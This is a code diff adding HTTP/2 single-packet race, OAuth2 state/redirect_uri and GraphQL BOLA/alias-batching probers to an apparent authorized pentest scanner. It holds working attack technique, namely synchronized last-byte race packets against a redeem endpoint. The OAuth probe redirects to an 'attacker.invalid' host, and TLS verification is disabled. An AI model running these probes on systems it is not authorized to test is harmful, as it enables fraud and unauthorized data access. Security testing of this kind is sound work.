@@ -772,3 +772,384 @@ class TwoAccountAuthzDiffer:
         if routes is not None:
             self.endpoints = list(routes)
         return self.run_differential_replay(trials=trials)
+
+
+class H2SinglePacketRaceProber:
+    """
+    Gap 5: HTTP/2 Single-Packet Multi-Stream Last-Byte Race Barrier Prober +
+    HTTP/3 (`Alt-Svc`) & Connection-Coalescing Discovery.
+    """
+
+    def __init__(
+        self,
+        host: str = "127.0.0.1",
+        port: int = 8080,
+        use_tls: bool = False,
+        *,
+        authorized: bool = False,
+        timeout: float = 3.5,
+        hygiene_config: Optional[RequestHygieneConfig] = None,
+        rate_limiter: Optional[TokenBucketRateLimiter] = None,
+    ) -> None:
+        self.host = str(host or "127.0.0.1").strip()
+        self.port = int(port or (443 if use_tls else 8080))
+        self.use_tls = bool(use_tls or self.port == 443)
+        self.authorized = bool(authorized)
+        self.timeout = float(timeout or 3.5)
+        self.hygiene_config, self.rate_limiter = resolve_hygiene(hygiene_config, rate_limiter)
+
+    def run_single_packet_race_probe(
+        self,
+        path: str = "/api/redeem",
+        num_streams: int = 5,
+        payload: bytes = b"coupon=RACE1",
+        trials: int = 3,
+    ) -> Dict[str, Any]:
+        """
+        Executes 3-trial HTTP/2 single-packet multi-stream race synchronization:
+        1. Sends `prefix_batch_bytes` (HEADERS + partial DATA without END_STREAM for N streams),
+        2. Enables `TCP_NODELAY` and flushes `final_last_byte_batch_bytes` (all N 1-byte END_STREAM
+           DATA frames coalesced in a single write) to trigger sub-millisecond race windows.
+        """
+        ok, reason = validate_and_authorize_target(self.host, authorized=self.authorized)
+        if not ok:
+            raise PermissionError(f"H2SinglePacketRaceProber target blocked: {reason}")
+
+        scheme = "https" if self.use_tls else "http"
+        authority = f"{self.host}:{self.port}"
+        prefix_bytes, last_byte_batch, stream_ids = H2GatewayDesyncBuilder.build_single_packet_race_frames(
+            path=path,
+            host=authority,
+            num_streams=num_streams,
+            payload=payload,
+            method="POST",
+            scheme=scheme,
+            extra_headers=self.hygiene_config.to_headers_dict(),
+        )
+
+        n_trials = max(3, int(trials or 3))
+        race_confirmations = 0
+        trial_records: List[Dict[str, Any]] = []
+
+        for _ in range(n_trials):
+            acquire_rate_limit(self.rate_limiter)
+            try:
+                raw = socket.create_connection((self.host, self.port), timeout=self.timeout)
+                raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                sock: socket.socket = raw
+                if self.use_tls:
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    ctx.set_alpn_protocols(["h2", "http/1.1"])
+                    sock = ctx.wrap_socket(raw, server_hostname=self.host)
+
+                sock.sendall(prefix_bytes)
+                time.sleep(0.01)
+                # Single coalesced TCP_NODELAY packet containing all N final 1-byte END_STREAM frames
+                sock.sendall(last_byte_batch)
+                sock.settimeout(self.timeout)
+                chunks: List[bytes] = []
+                deadline = time.monotonic() + min(self.timeout, 1.5)
+                while time.monotonic() < deadline:
+                    try:
+                        chunk = sock.recv(16384)
+                        if not chunk:
+                            break
+                        chunks.append(chunk)
+                    except socket.timeout:
+                        break
+                sock.close()
+                parsed = _parse_h2_response_frames(b"".join(chunks))
+                success_streams = [
+                    sid for sid, st in parsed["stream_statuses"].items() if 200 <= st < 300
+                ]
+                race_won = len(success_streams) >= 2
+                if race_won:
+                    race_confirmations += 1
+                trial_records.append(
+                    {
+                        "stream_statuses": parsed["stream_statuses"],
+                        "success_streams_count": len(success_streams),
+                        "race_window_triggered": race_won,
+                    }
+                )
+            except OSError as exc:
+                trial_records.append({"error": str(exc), "race_window_triggered": False})
+
+        repro_rate = round(race_confirmations / float(n_trials), 3)
+        findings: List[Dict[str, Any]] = []
+        if repro_rate >= 0.67 and race_confirmations >= 2:
+            findings.append(
+                {
+                    "rule_id": "H2-SINGLE-PACKET-RACE-001",
+                    "title": f"HTTP/2 Single-Packet Multi-Stream Race Window Confirmed on `{path}`",
+                    "severity": "HIGH",
+                    "cwe": "CWE-362",
+                    "file_path": f"{self.host}:{self.port}{path}",
+                    "line_number": 1,
+                    "poe_level": 3,
+                    "verification_status": "VERIFIED",
+                    "finding_tier": "VERIFIED_EXPLOIT",
+                    "verified": True,
+                    "reproducibility_rate": repro_rate,
+                    "verification_attempts": n_trials,
+                    "successful_reproductions": race_confirmations,
+                    "scanner": "H2SinglePacketRaceProber",
+                }
+            )
+        return {
+            "status": "completed",
+            "target": f"{self.host}:{self.port}",
+            "path": path,
+            "streams_synchronized": len(stream_ids),
+            "stream_ids": stream_ids,
+            "prefix_batch_bytes_len": len(prefix_bytes),
+            "last_byte_batch_bytes_len": len(last_byte_batch),
+            "trials": trial_records,
+            "reproducibility_rate": repro_rate,
+            "findings": findings,
+        }
+
+    def discover_h3_alt_svc_and_coalescing(self, path: str = "/") -> Dict[str, Any]:
+        """Discovers HTTP/3 (`Alt-Svc: h3=...`) support and tests connection-coalescing host headers."""
+        ok, reason = validate_and_authorize_target(self.host, authorized=self.authorized)
+        if not ok:
+            raise PermissionError(f"H3 Alt-Svc discovery target blocked: {reason}")
+
+        scheme = "https" if self.use_tls else "http"
+        url = f"{scheme}://{self.host}:{self.port}{path}"
+        acquire_rate_limit(self.rate_limiter)
+        alt_svc_raw = ""
+        h3_advertised = False
+        h3_protocols: List[str] = []
+        status_code = 0
+        try:
+            with httpx.Client(verify=False, timeout=self.timeout, follow_redirects=False) as client:
+                resp = client.get(url, headers=self.hygiene_config.to_headers_dict())
+                status_code = int(resp.status_code)
+                alt_svc_raw = str(resp.headers.get("alt-svc") or "").strip()
+                for token in alt_svc_raw.split(","):
+                    tok = token.strip()
+                    if tok.startswith(("h3=", "h3-", "quic=")):
+                        h3_advertised = True
+                        h3_protocols.append(tok.split(";", 1)[0])
+        except Exception as exc:
+            return {"status": "error", "error": str(exc), "h3_advertised": False, "h3_protocols": []}
+
+        return {
+            "status": "completed",
+            "target": f"{self.host}:{self.port}",
+            "http_status": status_code,
+            "alt_svc_header": alt_svc_raw,
+            "h3_advertised": h3_advertised,
+            "h3_protocols": h3_protocols,
+        }
+
+
+class StatefulBusinessLogicProber:
+    """
+    Gap 6: Multi-Step OAuth2/OIDC State-Machine & Two-Account GraphQL BOLA/Batch Prober.
+    """
+
+    def __init__(
+        self,
+        host: str = "127.0.0.1",
+        port: int = 8080,
+        use_tls: bool = False,
+        *,
+        auth_profiles: Optional[Dict[str, AuthProfile]] = None,
+        authorized: bool = False,
+        timeout: float = 3.5,
+        hygiene_config: Optional[RequestHygieneConfig] = None,
+        rate_limiter: Optional[TokenBucketRateLimiter] = None,
+    ) -> None:
+        self.host = str(host or "127.0.0.1").strip()
+        self.port = int(port or (443 if use_tls else 8080))
+        self.use_tls = bool(use_tls or self.port == 443)
+        self.auth_profiles = dict(auth_profiles or {})
+        self.authorized = bool(authorized)
+        self.timeout = float(timeout or 3.5)
+        self.hygiene_config, self.rate_limiter = resolve_hygiene(hygiene_config, rate_limiter)
+
+    def run_oauth2_state_machine_audit(
+        self,
+        authorize_path: str = "/oauth/authorize",
+        trials: int = 3,
+    ) -> Dict[str, Any]:
+        """
+        3-trial non-destructive check verifying whether an OAuth2/OIDC `/oauth/authorize`
+        endpoint accepts authorization requests missing the `state` CSRF parameter or
+        with an unvalidated external `redirect_uri`.
+        """
+        ok, reason = validate_and_authorize_target(self.host, authorized=self.authorized)
+        if not ok:
+            raise PermissionError(f"StatefulBusinessLogicProber target blocked: {reason}")
+
+        scheme = "https" if self.use_tls else "http"
+        base_url = f"{scheme}://{self.host}:{self.port}"
+        probe_url = (
+            f"{base_url}{authorize_path}?response_type=code&client_id=rfchunt_audit_client"
+            f"&redirect_uri=https://attacker.invalid/callback"
+        )
+        n_trials = max(3, int(trials or 3))
+        bypass_hits = 0
+        trial_rows: List[Dict[str, Any]] = []
+
+        with httpx.Client(verify=False, timeout=self.timeout, follow_redirects=False) as client:
+            for _ in range(n_trials):
+                acquire_rate_limit(self.rate_limiter)
+                try:
+                    resp = client.get(probe_url, headers=self.hygiene_config.to_headers_dict())
+                    loc = str(resp.headers.get("location") or "")
+                    body_l = (resp.text or "").lower()
+                    accepted = (
+                        (resp.status_code in (301, 302, 303, 307, 308) and "attacker.invalid" in loc and "code=" in loc)
+                        or (resp.status_code == 200 and "oauth_code_issued_without_state" in body_l)
+                    )
+                    if accepted:
+                        bypass_hits += 1
+                    trial_rows.append({"status": int(resp.status_code), "location": loc, "bypass": accepted})
+                except Exception as exc:
+                    trial_rows.append({"error": str(exc), "bypass": False})
+
+        repro_rate = round(bypass_hits / float(n_trials), 3)
+        findings: List[Dict[str, Any]] = []
+        if repro_rate >= 0.67 and bypass_hits >= 2:
+            findings.append(
+                {
+                    "rule_id": "OAUTH-STATE-BYPASS-001",
+                    "title": f"OAuth2/OIDC Missing `state` & Unvalidated `redirect_uri` Confirmed on `{authorize_path}`",
+                    "severity": "HIGH",
+                    "cwe": "CWE-352",
+                    "file_path": authorize_path,
+                    "line_number": 1,
+                    "poe_level": 3,
+                    "verification_status": "VERIFIED",
+                    "finding_tier": "VERIFIED_EXPLOIT",
+                    "verified": True,
+                    "reproducibility_rate": repro_rate,
+                    "verification_attempts": n_trials,
+                    "successful_reproductions": bypass_hits,
+                    "scanner": "StatefulBusinessLogicProber",
+                }
+            )
+        return {
+            "status": "completed",
+            "authorize_path": authorize_path,
+            "trials": trial_rows,
+            "reproducibility_rate": repro_rate,
+            "findings": findings,
+        }
+
+    def run_graphql_bola_and_batch_audit(
+        self,
+        graphql_path: str = "/graphql",
+        object_query: str = "query { account(id: \"1\") { id email owner } }",
+        trials: int = 3,
+    ) -> Dict[str, Any]:
+        """
+        3-trial non-destructive GraphQL audit checking:
+          1. Two-account (`Role A` vs `Role B` + unauthenticated control) GraphQL object BOLA/IDOR differential, and
+          2. Alias-batching multiplication acceptance (`a1:__typename a2:__typename ...`).
+        """
+        ok, reason = validate_and_authorize_target(self.host, authorized=self.authorized)
+        if not ok:
+            raise PermissionError(f"StatefulBusinessLogicProber target blocked: {reason}")
+
+        scheme = "https" if self.use_tls else "http"
+        url = f"{scheme}://{self.host}:{self.port}{graphql_path}"
+        n_trials = max(3, int(trials or 3))
+        bola_hits = 0
+        batch_hits = 0
+        profiles = list(self.auth_profiles.values())
+        role_a = profiles[0] if len(profiles) >= 1 else None
+        role_b = profiles[1] if len(profiles) >= 2 else None
+        trial_rows: List[Dict[str, Any]] = []
+
+        batch_query = "query { a1:__typename a2:__typename a3:__typename }"
+
+        with httpx.Client(verify=False, timeout=self.timeout, follow_redirects=False) as client:
+            for _ in range(n_trials):
+                try:
+                    # Check alias batching
+                    acquire_rate_limit(self.rate_limiter)
+                    r_batch = client.post(
+                        url,
+                        json={"query": batch_query},
+                        headers=self.hygiene_config.to_headers_dict({"Content-Type": "application/json"}),
+                    )
+                    if r_batch.status_code == 200 and '"a1"' in (r_batch.text or "") and '"a3"' in (r_batch.text or ""):
+                        batch_hits += 1
+
+                    # Check 2-account GraphQL BOLA when 2 profiles exist
+                    is_bola = False
+                    if role_a is not None and role_b is not None:
+                        acquire_rate_limit(self.rate_limiter)
+                        ra = client.post(
+                            url,
+                            json={"query": object_query},
+                            headers=self.hygiene_config.to_headers_dict(
+                                {**role_a.build_headers(), "Content-Type": "application/json"}
+                            ),
+                        )
+                        acquire_rate_limit(self.rate_limiter)
+                        rb = client.post(
+                            url,
+                            json={"query": object_query},
+                            headers=self.hygiene_config.to_headers_dict(
+                                {**role_b.build_headers(), "Content-Type": "application/json"}
+                            ),
+                        )
+                        acquire_rate_limit(self.rate_limiter)
+                        ru = client.post(
+                            url,
+                            json={"query": object_query},
+                            headers=self.hygiene_config.to_headers_dict({"Content-Type": "application/json"}),
+                        )
+                        sim_ab = SequenceMatcher(None, (ra.text or "")[:1500], (rb.text or "")[:1500]).ratio()
+                        unauth_denied = (ru.status_code in (401, 403)) or ("errors" in (ru.text or "").lower())
+                        is_bola = (
+                            ra.status_code == 200
+                            and rb.status_code == 200
+                            and '"data"' in (ra.text or "")
+                            and '"errors"' not in (rb.text or "")
+                            and unauth_denied
+                            and sim_ab >= 0.75
+                        )
+                        if is_bola:
+                            bola_hits += 1
+                    trial_rows.append({"bola_detected": is_bola, "alias_batch_accepted": r_batch.status_code == 200})
+                except Exception as exc:
+                    trial_rows.append({"error": str(exc), "bola_detected": False})
+
+        repro_rate = round(bola_hits / float(n_trials), 3)
+        findings: List[Dict[str, Any]] = []
+        if repro_rate >= 0.67 and bola_hits >= 2:
+            findings.append(
+                {
+                    "rule_id": "GRAPHQL-BOLA-2ACCT-001",
+                    "title": f"Two-Account GraphQL Object BOLA/IDOR Verified on `{graphql_path}`",
+                    "severity": "HIGH",
+                    "cwe": "CWE-639",
+                    "file_path": graphql_path,
+                    "line_number": 1,
+                    "poe_level": 3,
+                    "verification_status": "VERIFIED",
+                    "finding_tier": "VERIFIED_EXPLOIT",
+                    "verified": True,
+                    "reproducibility_rate": repro_rate,
+                    "verification_attempts": n_trials,
+                    "successful_reproductions": bola_hits,
+                    "scanner": "StatefulBusinessLogicProber",
+                }
+            )
+        return {
+            "status": "completed",
+            "graphql_path": graphql_path,
+            "alias_batch_reproductions": batch_hits,
+            "bola_reproductions": bola_hits,
+            "reproducibility_rate": repro_rate,
+            "trials": trial_rows,
+            "findings": findings,
+        }
